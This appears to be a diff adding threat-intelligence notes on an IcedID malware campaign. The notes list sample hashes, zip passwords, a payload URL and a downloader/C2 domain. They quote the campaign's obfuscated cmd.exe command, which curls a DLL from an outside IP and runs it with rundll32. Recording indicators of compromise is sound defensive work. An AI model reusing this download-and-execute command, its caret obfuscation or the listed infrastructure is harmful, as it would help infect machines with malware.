@@ -1,0 +1,27 @@
+IcedID | 22.08.2022 | Campaign 81003051
+
+***************************************
+
+.zip 1b74e397191b480a33c2d4f65627a9facc959007a1f58a019015ab86297b2471 pw = Office020822
+.zip 9a70f0269439e9806f41c67e33487fa140b23b3216e11c1ec46d3592f47f2bda pw = Office020822
+.iso 84e281b7755da1f89e3ed2b109556002c40547292deed3f7a7754707c69396fd
+.dll 2c87388d5f2eba48cd479c05c837a5e4a661927fc0ade00b986489a449ad0e3c
+
+***************************************
+
+Exec >>
+
+C:\Windows\System32\cmd.exe /c "start 2YFRUxV1.png && c^u^rl ""http://138.124.183.52/zazaz/poJvYMKG2T4IG3FTaI3C61d9kqrjaTG4jQ~~/Y9KL4c43P_KjnBiEEcDDqtfX-bmhiyLj8g~~/"" -o %temp%\9jXqQZQh.dll && start r^un^dl^l3^2 %temp%\9jXqQZQh.d^l^l, #1"
+
+***************************************
+
+.dll 
+
+http://138.124.183.52/zazaz/poJvYMKG2T4IG3FTaI3C61d9kqrjaTG4jQ~~/Y9KL4c43P_KjnBiEEcDDqtfX-bmhiyLj8g~~/
+
+c2's
+
+http://satisfyammyz.com/ - downloader
+
+
+***************************************
